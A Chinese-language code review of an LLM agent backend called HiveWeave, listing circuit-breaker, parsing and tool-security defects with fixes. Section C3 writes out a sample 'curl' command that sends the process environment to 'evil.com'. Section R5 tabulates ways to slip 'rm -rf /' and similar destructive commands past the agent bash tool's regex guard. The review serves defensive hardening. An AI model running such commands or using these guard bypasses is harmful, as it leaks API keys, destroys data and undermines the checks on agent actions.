# HiveWeave Python 后端五轴对抗式代码审查

**审查范围:** LLM 层 (streamer/provider/retry/circuit_breaker) + 工具执行层 (executor/bash/file/patch/grep/websearch/review/question/todowrite)
**审查日期:** 2026-07-05
**审查方法:** 正确性 / 可读性 / 架构 / 安全 / 性能

---

## Critical — 阻塞合并

### C1. 熔断器 fallback 路径是完全死代码

**文件:** `streamer.py` 第 398-409 行

```python
cb_result = await self._circuit_breaker.check(provider_name)
if not cb_result.allowed:
    if cb_result.fallback:
        log.info("circuit_fallback", ...)
        # 切换到 fallback（简化: 使用同一 config，实际应解析 fallback model）
    else:
        return self._error_result("All providers unavailable", start_time)
```

**问题:** 当 `cb_result.fallback` 为真时，代码只打了一条日志，然后**既不 return 也不切换 provider**。控制流直接落到第 412 行 `_fire_delta(on_delta, {"type": "start"})`，继续用被熔断的同一个 provider 发请求。熔断器的 fallback 机制完全失效。

**影响:** provider 连续失败 5 次后熔断器打开，但所有请求仍然打到同一个故障 provider，熔断器形同虚设。

**修复建议:** 要么实现 fallback provider 切换逻辑（从 `cb_result.fallback` 解析备用模型配置并重新创建 `ProviderConfig`），要么在 fallback 未实现时直接 return error：

```python
if not cb_result.allowed:
    if cb_result.fallback:
        log.info("circuit_fallback", ...)
        # TODO: 实现 fallback provider 切换
        return self._error_result(
            f"Fallback to {cb_result.fallback} not yet implemented", start_time
        )
    else:
        return self._error_result("All providers unavailable", start_time)
```

---

### C2. 熔断器永远不会感知到 HTTP/网络错误

**文件:** `streamer.py` 第 427-445 行 + 第 839-849 行

**问题链:**

1. `_do_streaming_request` 在 HTTP 错误时抛出 `RetryableError`/`PermanentError`
2. `_stream_single_round` 第 841 行 `except (RetryableError, PermanentError)` 捕获异常，转换为 `{"status": "error", ...}` 字典返回
3. `_run_tool_loop` 第 494 行检查 `round_result["status"] == "error"` 后返回错误字典（不抛异常）
4. `stream` 第 427-430 行收到正常返回后**无条件调用 `report_success`**

```python
result = await asyncio.wait_for(
    self._run_tool_loop(...),
    timeout=TOTAL_TIMEOUT_S,
)
await self._circuit_breaker.report_success(provider_name)  # ← 即使 result["status"]=="error" 也执行
```

**影响:** HTTP 429/503/504/529、网络超时、连接错误全部被吞掉，熔断器的失败计数器永远不会因为这些错误递增。只有 300 秒总超时（`asyncio.TimeoutError`）或未捕获异常才会触发 `report_failure`。5 次总超时 = 25 分钟才能熔断，熔断器在实际场景中几乎不会打开。

**修复建议:** 在 `stream` 方法中检查 result 状态：

```python
result = await asyncio.wait_for(self._run_tool_loop(...), timeout=TOTAL_TIMEOUT_S)
if result.get("status") == "error":
    await self._circuit_breaker.report_failure(provider_name)
else:
    await self._circuit_breaker.report_success(provider_name)
```

---

### C3. bash 工具向子进程泄露全部环境变量（含 API Key）

**文件:** `bash.py` 第 90-94 行

```python
env = {
    **os.environ,          # ← 泄露所有环境变量
    "HIVEWEAVE_BASH": "1",
    "HIVEWEAVE_WORKSPACE": cwd,
}
```

**问题:** `**os.environ` 将服务器进程的所有环境变量传递给 bash 子进程，包括 `OPENAI_API_KEY`、`OPENCODE_API_KEY`、`ANTHROPIC_API_KEY`、`DEEPSEEK_API_KEY` 等敏感密钥。恶意命令可通过 `env > /tmp/leak.txt` 或 `curl -d @- https://evil.com < /proc/self/environ` 窃取密钥。

**影响:** 任何有 `bash` 工具权限的 agent（`readonly` 模式即可）都能读取所有 API 密钥，造成凭据泄露。

**修复建议:** 使用白名单方式传递环境变量：

```python
_SAFE_ENV_KEYS = {"PATH", "HOME", "USER", "LANG", "LC_ALL", "TERM",
                   "SystemRoot", "TEMP", "TMP", "TMPDIR"}
env = {k: v for k, v in os.environ.items() if k in _SAFE_ENV_KEYS}
env["HIVEWEAVE_BASH"] = "1"
env["HIVEWEAVE_WORKSPACE"] = cwd
```

---

## Required — 必须修复

### R1. 熔断器 half_open 状态允许所有并发请求通过

**文件:** `circuit_breaker.py` 第 190-204 行

```python
if b.state is CircuitState.HALF_OPEN:
    if b.probe_deadline is not None and now > b.probe_deadline:
        b.open()
        return CheckResult.fallback_to(b.fallback)
    return CheckResult.ok()   # ← 所有并发调用者都放行
```

**问题:** half_open 语义应只允许 1 个探针请求通过，但代码对所有进入 half_open 状态的 `check` 调用都返回 `ok()`。`probe_deadline` 设为 60 秒，意味着在这 60 秒窗口内，所有并发请求都能绕过熔断器访问故障 provider。

注释（第 197-203 行）承认了这个问题但声称"实际效果：第一个 check 放行，后续走 fallback"——这是错误的，因为没有任何机制标记"探针正在执行中"。

**修复建议:** 增加 `probe_in_flight` 标志：

```python
class _BreakerState:
    __slots__ = (..., "probe_in_flight")
    
# 在 check 中:
if b.state is CircuitState.HALF_OPEN:
    if b.probe_deadline and now > b.probe_deadline:
        b.open()
        return CheckResult.fallback_to(b.fallback)
    if b.probe_in_flight:
        return CheckResult.fallback_to(b.fallback)  # 探针在飞，走 fallback
    b.probe_in_flight = True
    return CheckResult.ok()

# 在 report_success/report_failure 中:
b.probe_in_flight = False
```

---

### R2. SSE 解析器不处理 `\r\n\r\n` 事件分隔符

**文件:** `streamer.py` 第 114 行

```python
parts = buffer.split("\n\n")
```

**问题:** SSE 规范（HTML5）允许事件以 `\n\n`、`\r\n\r\n` 或 `\r\r` 分隔。当服务器使用 `\r\n` 行尾时（如 `"data: {...}\r\n\r\n"`），`split("\n\n")` 无法匹配分隔符（两个 `\n` 之间有 `\r`），整个 buffer 被当作 leftover 保留，事件永远不会被解析。

**影响:** 如果 LLM API 或中间代理使用 `\r\n` 行尾，流式响应将完全无输出。虽然主流 OpenAI 兼容 API 使用 `\n`，但某些 CDN/代理可能转换行尾。

**修复建议:** 标准化行尾后分割：

```python
def parse_sse(buffer: str) -> tuple[list[dict], str]:
    if not buffer:
        return [], ""
    # 标准化 \r\n -> \n
    buffer = buffer.replace("\r\n", "\n").replace("\r", "\n")
    parts = buffer.split("\n\n")
    *complete, leftover = parts
    ...
```

---

### R3. Doom loop 检测器不跟踪连续性，会产生误报

**文件:** `streamer.py` 第 1112-1127 行

```python
@staticmethod
def _detect_doom_loop(tool_calls, tracker):
    for tc in tool_calls:
        key = (tc["name"], tc["arguments"])
        count = tracker.get(key, 0) + 1
        tracker[key] = count
        if count >= DOOM_LOOP_THRESHOLD:  # 3
            return tc["name"]
    return None
```

**问题:** docstring 说"连续 N 次"，但实现只累加总数，从不重置计数。如果 agent 在第 1、5、10 轮调用相同工具+相同参数（非连续），计数达到 3 也会触发 doom loop。合法的重复操作（如多次读取同一文件）会被误判为 doom loop。

**修复建议:** 在每轮开始时，对未在本轮出现的 key 重置计数：

```python
# 在 _run_tool_loop 的 for 循环开始处:
this_round_keys = set()

# _detect_doom_loop 改为:
for tc in tool_calls:
    key = (tc["name"], tc["arguments"])
    this_round_keys.add(key)
    # 重置不在本轮的 key
    for k in list(tracker.keys()):
        if k not in this_round_keys:
            del tracker[k]
    count = tracker.get(key, 0) + 1
    tracker[key] = count
    if count >= DOOM_LOOP_THRESHOLD:
        return tc["name"]
```

---

### R4. 上下文裁剪会破坏 tool_calls/tool_result 配对

**文件:** `streamer.py` 第 1164-1172 行

```python
while len(tail) > 2 and estimate_tokens_for_messages(head + tail) > usable:
    drop = 1
    if len(tail) > 1:
        if "tool_calls" in tail[0] and "tool_call_id" in tail[1]:
            drop = 2
        elif "tool_call_id" in tail[0] and "tool_calls" in tail[1]:
            drop = 2
    tail = tail[drop:]
```

**问题:** 当一个 assistant 消息触发多个 tool result 时（如 5 个工具调用），裁剪逻辑只检查相邻的 2 条消息。场景：

```
tail = [assistant(tool_calls: [tc1, tc2, tc3]), tool_result(tc1), tool_result(tc2), tool_result(tc3), assistant_2, ...]
```

第一轮：`tail[0]` 是 assistant(tool_calls)，`tail[1]` 是 tool_result → drop=2
结果：`tail = [tool_result(tc2), tool_result(tc3), assistant_2, ...]`

`tool_result(tc2)` 和 `tool_result(tc3)` 变成孤儿——它们对应的 assistant(tool_calls) 已被删除。OpenAI API 会拒绝包含无主 tool_call_id 的请求，返回 400 错误。

**修复建议:** 完整删除一个 assistant(tool_calls) 及其所有后续 tool_result：

```python
while len(tail) > 2 and estimate_tokens_for_messages(head + tail) > usable:
    if "tool_calls" in tail[0]:
        # 删除 assistant + 所有跟随的 tool_result
        drop = 1
        while drop < len(tail) and "tool_call_id" in tail[drop]:
            drop += 1
    elif "tool_call_id" in tail[0]:
        # 孤儿 tool_result，直接删
        drop = 1
    else:
        drop = 1
    tail = tail[drop:]
```

---

### R5. bash 自毁命令检测可通过多种方式绕过

**文件:** `bash.py` 第 38-54 行

**问题:** 7 个正则模式可被绕过：

| 绕过方式 | 示例 | 说明 |
|---------|------|------|
| flag 顺序 | `rm -fr /` | `-fr` 不匹配 `rm\s+-rf\s+/` |
| `--` 分隔符 | `rm -rf -- /` | `--` 打断匹配 |
| 变量间接 | `X=/; rm -rf $X` | 变量展开后执行 |
| 子 shell | `$(echo rm) -rf /` | 命令替换 |
| 路径变体 | `rm -rf /*` | 匹配但 `rm -rf ~/..` 不匹配 |
| Python/Perl | `python -c "import shutil; shutil.rmtree('/')"` | 完全绕过 |

同时，substring 匹配（`shutdown`、`reboot`、`diskpart`）会产生**误报**：`cat shutdown.txt`、`grep reboot logfile` 都会被拦截。

**修复建议:**
1. 将 substring 匹配改为 word-boundary 匹配
2. 对 `rm` 命令做参数解析而非正则
3. 核心防护应依赖 Docker 沙箱（`BASH_SANDBOX=docker` 作为默认），正则只作为补充

```python
# word-boundary 版本
re.compile(r"\bshutdown\b", re.I),
re.compile(r"\breboot\b", re.I),
re.compile(r"\bdiskpart\b", re.I),
```

---

### R6. run_command 是无任何自毁检测的 bash 逃生舱

**文件:** `bash.py` 第 277-335 行

**问题:** `execute_run_command` 的 docstring 明确说"NO self-destructive guard"。该工具在 `permission.py` 中属于 `ALL_TOOLS`（仅 `full` 模式），但 `full` 模式下所有工具自动 `allow`，不经过 `ask`。这意味着 `full` 权限的 agent 可以无限制执行 `rm -rf /`、`shutdown` 等命令。

**影响:** 被注入的 agent 或行为异常的 agent 在 `full` 模式下可执行任意破坏性命令。

**修复建议:** 即使是 `run_command`，也应执行自毁检测。如果需要保留逃生舱语义，可以增加 `--force` 参数跳过检测，但默认必须检查。

---

### R7. apply_patch 不检查敏感文件模式

**文件:** `patch.py` 第 45-115 行

**问题:** `_apply_single` 只做沙箱检查（`_resolve_safe`），不检查敏感文件模式。agent 可以通过 patch 修改 `.env`、`id_rsa`、`credentials.json` 等文件，绕过 `file.py` 的 `SENSITIVE_PATTERNS` 保护。

**影响:** 敏感凭据文件可被读取或覆盖，导致密钥泄露或被替换。

**修复建议:** 在 `_apply_single` 中增加敏感文件检查（从 `file.py` 导入 `_is_sensitive` 或提取为共享工具函数）：

```python
from hiveweave.tools.file import _is_sensitive

# 在 _apply_single 中:
if _is_sensitive(file_path):
    return f"ERROR: Access denied: '{file_path}' matches a sensitive file pattern."
```

---

### R8. grep 不排除敏感文件，可泄露密钥

**文件:** `grep.py` 第 137-161 行（`_walk_files`）+ 第 75-134 行（`_try_ripgrep`）

**问题:** `_walk_files` 只跳过 `IGNORED_DIRS`（目录），不跳过敏感文件。如果 agent 搜索 `password`、`key`、`secret` 等关键词，`.env`、`id_rsa`、`credentials.json` 中的匹配行会返回给 LLM。ripgrep 路径同样不排除敏感文件。

**影响:** 敏感信息通过 grep 结果泄露给 LLM。

**修复建议:** 在 `_walk_files` 中增加敏感文件过滤：

```python
from hiveweave.tools.file import _is_sensitive

for path in root.rglob("*"):
    if not path.is_file():
        continue
    if _is_sensitive(path.name):
        continue
    ...
```

ripgrep 路径增加 `--glob '!*.env'` 等排除参数。

---

### R9. review 工具不检查敏感文件，会将密钥内容发送给 LLM

**文件:** `review.py` 第 159-183 行（`_safe_read_file`）

**问题:** `_safe_read_file` 只做沙箱检查，不检查敏感文件模式。如果 agent 请求审查 `.env` 或 `credentials.json`，文件内容会被读取并拼入 prompt 发送给 LLM。

**修复建议:** 在 `_safe_read_file` 中增加敏感文件检查，返回 `None` 表示拒绝读取。

---

### R10. websearch 禁用 SSL 证书验证

**文件:** `websearch.py` 第 210 行

```python
async with httpx.AsyncClient(
    timeout=timeout, proxy=proxy_url, verify=False  # ← 禁用 SSL
) as client:
```

**问题:** `verify=False` 禁用 TLS 证书验证，允许中间人攻击。搜索请求虽然不含敏感数据，但响应可被篡改（注入恶意链接、钓鱼内容）。

**修复建议:** 删除 `verify=False`。如果需要支持自签名证书的代理，应通过 `SSL_CERT_FILE` 环境变量配置，而非全局禁用验证。

---

### R11. bash 工具将全部输出读入内存后才截断

**文件:** `bash.py` 第 113-114 行

```python
stdout_bytes, _ = await asyncio.wait_for(
    proc.communicate(), timeout=timeout_s
)
```

**问题:** `proc.communicate()` 将 stdout 全部读入内存后才调用 `_truncate_output` 截断。如果命令产生大量输出（如 `yes`、`find /`、`cat /dev/urandom`），内存会被耗尽。`MAX_CAPTURE_BYTES = 1MB` 的截断只在事后生效。

**影响:** 恶意或意外的命令可导致 OOM（内存耗尽）崩溃。

**修复建议:** 使用流式读取，达到阈值后停止读取：

```python
async def _read_with_limit(proc, max_bytes):
    buf = bytearray()
    while True:
        chunk = await proc.stdout.read(8192)
        if not chunk:
            break
        buf.extend(chunk)
        if len(buf) >= max_bytes:
            buf.extend(b"\n... [output truncated at 1MB]")
            proc.kill()  # 可选：终止产生过多输出的进程
            break
    return bytes(buf)
```

---

### R12. bash 超时后不杀进程树

**文件:** `bash.py` 第 117-126 行

```python
except asyncio.TimeoutError:
    try:
        proc.kill()  # ← 只杀 shell 进程，不杀子进程
    except ProcessLookupError:
        pass
```

**问题:** `proc.kill()` 在 Unix 上发送 SIGKILL 到 shell 进程（`bash`），但 shell 的子进程（实际执行的命令）可能继续运行。在 Windows 上 `TerminateProcess` 同样只杀直接进程。导致超时后的僵尸进程持续消耗资源。

**修复建议:**

```python
# Unix: 用 process group
proc = await asyncio.create_subprocess_exec(
    *shell_args, preexec_fn=os.setsid, ...
)
# 超时后:
os.killpg(os.getpgid(proc.pid), signal.SIGKILL)

# Windows: 用 taskkill /T /F
asyncio.create_subprocess_exec("taskkill", "/T", "/F", "/PID", str(proc.pid))
```

---

### R13. todowrite 的 DELETE + INSERT 非原子操作

**文件:** `todowrite.py` 第 66-83 行

```python
await project_db.execute(agent_id, "DELETE FROM todos WHERE agent_id = ?", [agent_id])
for todo in normalized:
    await project_db.execute(agent_id, "INSERT INTO todos ...", [...])
```

**问题:** DELETE 和 INSERT 是独立的事务（假设 autocommit）。如果服务器在 DELETE 后、INSERT 完成前崩溃，agent 的所有 todo 数据丢失。

**修复建议:** 使用事务：

```python
async with project_db.transaction(agent_id):
    await project_db.execute(agent_id, "DELETE FROM todos WHERE agent_id = ?", [agent_id])
    for todo in normalized:
        await project_db.execute(agent_id, "INSERT INTO todos ...", [...])
```

如果 `project_db` 不支持 transaction 上下文管理器，可用 `BEGIN`/`COMMIT`/`ROLLBACK` 手动控制。

---

### R14. provider.py 对所有模型发送 temperature 参数

**文件:** `provider.py` 第 171 行

```python
body["temperature"] = temperature if temperature is not None else self.temperature
```

**问题:** OpenAI o1/o3/o4 等 reasoning 模型不支持 `temperature` 参数，发送会导致 400 错误。代码在第 190 行检查了 `supports_thinking` 来决定 `reasoning_effort`，但没有跳过 `temperature`。

**修复建议:**

```python
if not self.supports_thinking:
    body["temperature"] = temperature if temperature is not None else self.temperature
# reasoning 模型不发送 temperature
```

---

## Optional — 建议改进

### O1. provider.py 的 "openai.com" 匹配过于宽泛

**文件:** `provider.py` 第 316 行

`if "api.openai.com" in base_url or "openai.com" in base_url:` — 第二个条件会匹配 `https://my-openai.com.proxy.example.com` 等非 OpenAI URL。建议用 `urlparse` 提取域名后精确匹配。

### O2. grep.py 的 glob 转换不支持字符类

**文件:** `grep.py` 第 142-143 行

`re.escape(include).replace(r"\*", ".*").replace(r"\?", ".")` 不支持 `[abc]`（字符类）和 `{a,b}`（brace expansion）。建议用 `fnmatch.translate()` 替代手动转换。

### O3. executor.py 的 int() 转换未做输入验证

**文件:** `executor.py` 第 194、220、251 行

`int(args.get("offset") or 0)` — 如果 LLM 传入 `"offset": "abc"`，`int("abc")` 抛出 `ValueError`。虽然被外层 `try/except` 捕获，但错误消息是 `invalid literal for int() with base 10: 'abc'`，对 LLM 不友好。建议增加类型验证和有意义的错误消息。

### O4. bash.py 的 Docker 沙箱使用 `--network host`

**文件:** `bash.py` 第 150 行

`"--network", "host"` 给容器完整的宿主网络访问权限。恶意命令可访问本地数据库、Redis 等服务。建议默认使用 `--network none`，需要网络访问时通过白名单配置。

### O5. question.py 的 `resolve_question` 是同步函数但操作 asyncio.Future

**文件:** `question.py` 第 109-121 行

`future.set_result(answer)` 必须在创建 Future 的同一事件循环中调用。如果 API 路由处理器在不同线程或事件循环中运行，会抛 `RuntimeError`。建议改为 `asyncio.run_coroutine_threadsafe` 或确保调用方在同一循环中。

### O6. question.py 的 `_pending` 是模块级全局字典

**文件:** `question.py` 第 27 行

`_pending: dict[str, asyncio.Future[str]] = {}` — 全局共享，不支持多进程部署（多 worker 进程间不共享 pending 状态）。服务器重启后 pending 问题丢失（虽然持久化到 DB，但 Future 丢失）。建议改用 `asyncio.Event` + DB 轮询，或使用 Redis 等共享状态。

### O7. streamer.py 的 docstring 示例具有误导性

**文件:** `streamer.py` 第 326 行

```python
on_tool_call=lambda name, args, tid: tool_executor.execute(name, args),
```

这行代码有 3 个问题：`ToolExecutor.execute` 的签名是 `(agent_id, tool_name, tool_args, workspace_path)` 而非 `(name, args, tid)`；`args` 是字符串但 `execute` 期望 dict；返回格式是 `{success, output, error}` 而非 Streamer 期望的 `{content, ...}`。实际集成需要适配器（`agent.py:974` 的 `_on_tool_call` 已正确实现）。建议更新 docstring 或移除示例。

### O8. websearch.py 的 `proxy` 参数兼容性

**文件:** `websearch.py` 第 209 行

`httpx.AsyncClient(proxy=proxy_url)` — `proxy`（单数）是 httpx 0.26+ 的参数。如果项目依赖更早版本的 httpx，应使用 `proxies={"all://": proxy_url}`。建议在 `requirements.txt` 中锁定 httpx 版本。

---

## Nit — 小问题

### N1. patch.py 对已存在目录的报错信息误导

**文件:** `patch.py` 第 60-61 行

`if p.exists(): return f"ERROR: File already exists: {file_path}"` — 如果路径是目录，报 "File already exists" 不准确。应区分文件和目录。

### N2. grep.py 的 `os_sep()` 辅助函数不必要

**文件:** `grep.py` 第 211-213 行

`os_sep()` 返回 `os.sep`，但代码中 `str(fp).replace(root_str + os_sep(), "")` 可以直接用 `os.sep`。且 `Path.relative_to()` 更可靠。建议用 `fp.relative_to(root)` 获取相对路径。

### N3. file.py 的 `_is_binary` 在 OSError 时返回 False

**文件:** `file.py` 第 115-122 行

`except OSError: return False` — 如果文件无法打开（权限不足），返回 False（非二进制），导致后续 `read_text` 尝试读取并失败。应该返回 True（保守拒绝）或向上传播错误。

### N4. bash.py 的 substring 匹配产生误报

**文件:** `bash.py` 第 41-44 行

`re.compile(r"shutdown", re.I)` 会匹配 `cat shutdown.txt`、`echo "shutdown server"`。应改用 `\bshutdown\b` 做 word-boundary 匹配（与第 45 行的 `\bhalt\b` 一致）。

### N5. streamer.py 的 `_strip_placeholder` 只剥离开头

**文件:** `streamer.py` 第 1271-1275 行

如果 LLM 自身输出了与 `DEFAULT_PLACEHOLDER` 完全相同的文本，会被错误剥离。虽然概率极低，但建议用唯一标记（如 `\x00HIVEWEAVE_PLACEHOLDER\x00`）替代可读文本。

### N6. circuit_breaker.py 的 `CheckResult.fallback_to` 接受 None

**文件:** `circuit_breaker.py` 第 67-68 行

`def fallback_to(cls, name: str | None)` — 类型允许 None，但语义上 `fallback_to(None)` 等价于"全部不可用"。建议用单独方法或断言 `name is not None`。

---

## 架构总结

### 耦合问题
- **Streamer ↔ ToolExecutor 的接口不匹配**: Streamer 期望回调返回 `{content, ...}`，ToolExecutor 返回 `{success, output, error}`。当前由 `agent.py` 的 `_on_tool_call` 适配器桥接。建议将适配器逻辑下沉到 ToolExecutor（增加 `execute_for_llm` 方法返回 `{role, content, tool_call_id}`），消除每个调用方都要写适配器的需求。

### 熔断器粒度
- 熔断器是 **per-provider** 的（`circuit_breaker.py` 的 `_breakers: dict[str, _BreakerState]`），这是正确的。但由于 C1 和 C2 两个 Critical 问题，实际不工作。

### 工具注册表扩展性
- `executor.py` 的 `_dispatch` 是硬编码的 if-else 链（13 个工具）。新增工具需要修改 executor.py。建议改用注册表模式（`dict[str, ToolHandler]`），工具自注册，降低耦合。

### 安全一致性
- **敏感文件保护不统一**: `file.py` 有 `SENSITIVE_PATTERNS` 检查，但 `patch.py`、`grep.py`、`review.py` 都没有。建议提取为共享的 `security.py` 模块，所有文件操作工具统一调用。

---

## 性能总结

| 问题 | 文件 | 影响 |
|------|------|------|
| bash 全量读入内存 (R11) | bash.py:113 | OOM 风险 |
| grep Python fallback 全量读文件 | grep.py:183 | 大文件内存压力 |
| tool loop 25 轮上限合理 | streamer.py:45 | 合理，配合中轮提醒 |
| SSE 流式读取真正流式 | streamer.py:900-1000 | 正确，逐 chunk 解析 |
| read_file 分块读取 | file.py:179-206 | 正确，offset+limit 分页 |
| grep 结果上限 100 条 | grep.py:24 | 合理 |
